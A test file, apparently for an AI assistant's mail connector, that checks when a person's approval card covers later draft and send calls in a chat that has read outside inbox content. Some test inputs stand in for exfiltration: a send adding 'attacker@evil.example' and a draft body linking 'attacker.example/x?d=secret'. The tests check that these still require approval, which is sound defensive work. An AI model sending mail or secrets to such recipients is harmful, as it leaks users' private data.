// A connection write the person allowed on its card covers the same tool to the same recipients for the rest of that
// chat, and a draft they allowed may be sent unchanged without a second card (server/src/integrations/connections/
// tools.ts approvedWrite, server/src/chat/card-approvals.ts, docs/decisions/20261117-card-approved-once-per-chat.md).
// Reproduces FL-12 of the AI flow check (tests/ai-scenarios, 2026-11-17, default mode): after reading the inbox, a reply
// draft (its card), the edited draft (a second card for the same recipient) and the send (a third). Also: a new
// recipient or cc, a link in the text, another tool, another chat, another person's approval, a changed draft, a send
// that adds a recipient, a declined card, a Slack question: the card each time. Fake services only.
import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from 'bun:test'
import { makeCApp, type CApp, type Person } from '../lib/c-app'
import { FakeServices, MCP_KEY } from '../lib/fake-services'
import { integrationsOf } from '../../server/src/integrations/connections/service'
import { integrationToolProvider, madeIds } from '../../server/src/integrations/connections/tools'
import { TurnFiles } from '../../server/src/files/service'
import type { TurnTool, TurnToolContext } from '../../server/src/services'

setDefaultTimeout(30_000)

let A: CApp, fake: FakeServices
const json = (as: Person, p: string, method: string, body?: unknown) => A.json(p, { method, as, headers: { 'content-type': 'application/json' }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) })
let draftNo = 0

beforeAll(async () => {
  A = await makeCApp('c-card-approved-once-connector')
  fake = new FakeServices()
  fake.tools = [
    { name: 'list_inbox', description: 'List mail', inputSchema: { type: 'object' }, annotations: { readOnlyHint: true } },
    { name: 'create_draft', title: 'Create draft', description: 'Save a mail draft', inputSchema: { type: 'object', properties: { to: { type: 'string' }, cc: { type: 'string' }, subject: { type: 'string' }, body: { type: 'string' } }, required: ['to', 'body'] } },
    { name: 'update_draft', title: 'Update draft', description: 'Change a draft', inputSchema: { type: 'object', properties: { draft_id: { type: 'string' }, body: { type: 'string' } }, required: ['draft_id'] } },
    { name: 'send_mail', title: 'Send mail', description: 'Send a draft', inputSchema: { type: 'object', properties: { draft_id: { type: 'string' }, to: { type: 'string' } } } },
    { name: 'share_draft', title: 'Share draft', description: 'Share a draft', inputSchema: { type: 'object', properties: { draft_id: { type: 'string' } } } },
  ]
  integrationsOf(A.ctx, { net: fake.net() })
  const mail = (await json('alice', '/api/integrations', 'POST', { kind: 'mcp', name: 'Mail', url: `${fake.base}/mcp-key`, auth: 'bearer', secret: MCP_KEY })).body
  expect(mail.status).toBe('connected')
})
afterAll(async () => { fake?.stop(); await A?.close() })

interface Asker { answer: 'yes' | 'always' | 'no'; cards: string[] }
const asker = (answer: Asker['answer'] = 'yes'): Asker => ({ answer, cards: [] })

/** one turn of `user` in `chat` (a new chat when absent); the chat read the person's inbox (outside content) */
function turn(user: Person, p: Asker, o: { chat?: string; live?: boolean } = {}) {
  const chat = o.chat ?? A.chat(user)
  A.ctx.db.query('UPDATE chats SET session_tainted = 1, others_words = 1 WHERE id = ?').run(chat)
  const turnId = A.turn(user, chat)
  const built = integrationToolProvider(A.ctx).build({ userId: user, chatId: chat, turnId, browser: false, scheduled: false })
  const files = { user: A.ctx.files.principal(user), turnId, files: new TurnFiles() } as TurnToolContext['files']
  files.person = {
    locale: 'en',
    async confirm(question) { p.cards.push(question); return p.answer !== 'no' },
    async choose(question, options) {
      p.cards.push(question)
      const want = p.answer === 'yes' ? 'allow' : p.answer === 'no' ? 'deny' : p.answer
      return options.some((x) => x.value === want) ? want : null
    },
    *turnUrls() {},
    allSitesHere: () => o.live !== false,
    othersWords: () => true,
  }
  const tc: TurnToolContext = { turnId, chatId: chat, userId: user, messageId: 'm', locale: 'en', signal: new AbortController().signal, files }
  const tools = new Map(built.tools.map((t) => [t.name, t as TurnTool]))
  const call = async (name: string, args: unknown) => {
    const t = tools.get(name)
    if (!t) throw new Error(`no tool ${name}; have ${[...tools.keys()].join(', ')}`)
    const r = await t.call(args, tc)
    return { text: r.content.map((c) => (c.type === 'text' ? c.text : '')).join(''), isError: !!r.isError }
  }
  return { chat, call }
}
/** the next draft the fake service makes, by its id */
function nextDraft(): string {
  const id = `dr-${++draftNo}`
  fake.results.create_draft = { content: [{ type: 'text', text: JSON.stringify({ draft_id: id }) }] }
  return id
}
const sends = () => fake.calls.filter((c) => c.name === 'send_mail').length
const BUYER = 'buyer@lamaba.example'

describe('FL-12: reply draft, edited draft, send', () => {
  test('the first draft asks; the edited draft to the same recipient does not; sending the draft the person saw does not, an edited one asks', async () => {
    const first = asker()
    const t = turn('alice', first)
    const d1 = nextDraft()
    expect((await t.call('my_mail__create_draft', { to: BUYER, subject: 'RE: quote', body: 'We will check and get back to you.' })).isError).toBe(false)
    expect(first.cards).toHaveLength(1)
    // the edit: a new draft to the same recipient with other words (the mail service cannot change a saved draft)
    const edit = asker('no')
    const d2 = nextDraft()
    expect((await turn('alice', edit, { chat: t.chat }).call('my_mail__create_draft', { to: BUYER, subject: 'RE: quote', body: '25 boxes are fine; the contract comes on Friday.' })).isError).toBe(false)
    expect(edit.cards).toEqual([])
    // "send it": the edited draft's words were never on a card, so its send asks (declined: nothing sent)
    const n = sends()
    const send2 = asker('no')
    expect((await turn('alice', send2, { chat: t.chat }).call('my_mail__send_mail', { draft_id: d2 })).isError).toBe(true)
    expect(send2.cards).toHaveLength(1)
    expect(sends()).toBe(n)
    // the draft the person saw on its card, unchanged: sent without another card
    const send1 = asker('no')
    expect((await turn('alice', send1, { chat: t.chat }).call('my_mail__send_mail', { draft_id: d1 })).isError).toBe(false)
    expect(send1.cards).toEqual([])
    expect(sends()).toBe(n + 1)
    // ...once: the send names it, so it no longer counts as the draft the person saw
    const again = asker('no')
    await turn('alice', again, { chat: t.chat }).call('my_mail__send_mail', { draft_id: d1 })
    expect(again.cards).toHaveLength(1)
  })

  test('a draft sent after its card: a send that names it alone goes; with a recipient added, after an update, or by a share tool: the card', async () => {
    const yes = asker()
    const t = turn('alice', yes)
    const a = nextDraft()
    await t.call('my_mail__create_draft', { to: BUYER, body: 'Draft A' })
    const b = nextDraft()
    await turn('alice', asker(), { chat: t.chat }).call('my_mail__create_draft', { to: 'office@saaja.example', body: 'Draft B' })
    // a send that adds a recipient
    const wider = asker('no')
    await turn('alice', wider, { chat: t.chat }).call('my_mail__send_mail', { draft_id: a, to: 'attacker@evil.example' })
    expect(wider.cards).toHaveLength(1)
    // a share of the draft is no send
    const share = asker('no')
    await turn('alice', share, { chat: t.chat }).call('my_mail__share_draft', { draft_id: b })
    expect(share.cards).toHaveLength(1)
    // an update of draft B (allowed on its card): B no longer counts as the draft the person saw
    await turn('alice', asker(), { chat: t.chat }).call('my_mail__update_draft', { draft_id: b, body: 'changed' })
    const sendB = asker('no')
    await turn('alice', sendB, { chat: t.chat }).call('my_mail__send_mail', { draft_id: b })
    expect(sendB.cards).toHaveLength(1)
  })
})

describe('what the same target is', () => {
  test('a new recipient, a cc, a link in the text, another tool, another chat, a declined card, a Slack question: the card', async () => {
    const t = turn('alice', asker())
    nextDraft()
    await t.call('my_mail__create_draft', { to: BUYER, body: 'first' })
    const ask = async (args: Record<string, unknown>, o: { chat?: string; live?: boolean; tool?: string } = {}) => {
      const p = asker('no')
      nextDraft()
      await turn('alice', p, { chat: o.chat ?? t.chat, ...(o.live === false ? { live: false } : {}) }).call(o.tool ?? 'my_mail__create_draft', args)
      return p.cards.length
    }
    expect(await ask({ to: BUYER, body: 'same recipient, other words' })).toBe(0)
    expect(await ask({ to: 'other@lamaba.example', body: 'x' })).toBe(1)
    expect(await ask({ to: BUYER, cc: 'boss@lamaba.example', body: 'x' })).toBe(1)
    expect(await ask({ to: [BUYER, 'two@lamaba.example'].join(', '), body: 'x' })).toBe(1)
    expect(await ask({ to: BUYER, body: 'see https://attacker.example/x?d=secret' })).toBe(1)
    expect(await ask({ to: BUYER, body: 'see evil-site.com for more' })).toBe(1)
    expect(await ask({ draft_id: 'dr-x', body: 'x' }, { tool: 'my_mail__update_draft' })).toBe(1)
    expect(await ask({ to: BUYER, body: 'x' }, { chat: A.chat('alice') })).toBe(1)
    // a question asked from Slack (not watched in the app): the card
    expect(await ask({ to: BUYER, body: 'x' }, { live: false })).toBe(1)
    // a declined card keeps nothing
    const no = turn('alice', asker('no'))
    nextDraft()
    await no.call('my_mail__create_draft', { to: BUYER, body: 'declined' })
    expect(await ask({ to: BUYER, body: 'again' }, { chat: no.chat })).toBe(1)
    // twelve hours on: asked once more
    A.ctx.db.query("UPDATE chat_card_approvals SET created_at = '2000-01-01T00:00:00.000Z' WHERE chat_id = ?").run(t.chat)
    expect(await ask({ to: BUYER, body: 'later' })).toBe(1)
  })

  test('another person\'s approval in the same chat never covers this person', async () => {
    const t = turn('alice', asker())
    nextDraft()
    await t.call('my_mail__create_draft', { to: BUYER, body: 'first' })
    // the row is kept for alice only
    const rows = A.ctx.db.query('SELECT user_id, kind FROM chat_card_approvals WHERE chat_id = ? ORDER BY id').all(t.chat) as { user_id: string; kind: string }[]
    expect(rows).toEqual([{ user_id: 'alice', kind: 'connector' }, { user_id: 'alice', kind: 'connector_made' }])
  })

  test('the ids a draft answer names', () => {
    expect(madeIds('{"draft_id":"dr-a2nwnp"}')).toEqual(['dr-a2nwnp'])
    expect(madeIds('{"draft":{"id":"r-123","message":{"id":"m-9"}}}')).toEqual(['r-123', 'm-9'])
    expect(madeIds('created draft dr-1')).toEqual([])
    expect(madeIds('{"id":"has space"}')).toEqual([])
  })
})
